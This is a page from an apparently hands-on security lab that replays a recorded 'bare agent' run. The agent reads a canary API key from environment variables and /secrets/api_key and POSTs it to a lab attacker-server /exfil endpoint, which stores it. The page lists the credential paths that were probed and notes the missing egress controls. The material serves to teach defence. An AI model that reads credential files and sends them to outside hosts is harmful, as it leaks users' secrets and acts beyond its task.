---
title: What just happened
summary: Replay of the bare-agent leak from the recorded transcript and the attacker server response.
canary: leaked
server: 1 hit
legit: placeholder
plane: none
---

The board is the path. The two panes are the recorded request and the attacker server body the agent got back. `results/bare-attack.json`, scripted run of `bare-attack.sh`, `duration_seconds` 0.139. The canary value is omitted here. Your `/report` from the previous step still has it.

<div class="replay-stage">
![The canary reaches the attacker server.](../diagrams/story-04-exfil.svg)
<div class="log"><p>Request the agent sent</p><pre>POST http://attacker-server.lab01-shared.svc.cluster.local/exfil
request_headers {}
body {"key":"&lt;canary&gt;","source":"lab01","found":true}
status 200
response_body {"stored": true, "count": 1}</pre></div>
<div class="log"><p>Attacker server response</p><pre>{"stored": true, "count": 1}</pre></div>
</div>

The attacker server process returns immediately from `log_message`, so this HTTP body is the record. `GET /report` on your pod is the stored post.

<ol class="replay replay-5">
<li>The process read the secret. <code>env:CANARY_API_KEY</code> found true. <code>file:/secrets/api_key</code> found true. <code>env:API_KEY</code> and <code>env:VENDOR_API_KEY</code> found false. <code>file:/secrets/token</code> and <code>file:/var/run/secrets/lab01/api_key</code> returned <code>No such file or directory</code>.</li>
<li>It POSTed that attacker server URL. <code>request_headers</code> was empty. The body carried the canary, <code>source</code> <code>lab01</code>, and <code>found</code> true.</li>
<li>Status 200. The attacker server answered <code>{"stored": true, "count": 1}</code>. There was no error and no retry.</li>
<li>Bare agent has no egress gateway. kindnet does not enforce NetworkPolicy. The process held the key and opened a socket. <code>egress_denies</code> on this agent is null.</li>
<li>The attacker server holds one post. <code>score.sh bare</code> at 2026-10-19T11:20:43Z counted <code>canary_token_hits</code> 1 and <code>exfil_attempts</code> 1. That hit count is posts in <code>/report</code> whose body contains the canary.</li>
</ol>

[Back: Pwn it](05-attack-the-bare-agent.md)

[Next: Bare agent score](07-score-bare.md)
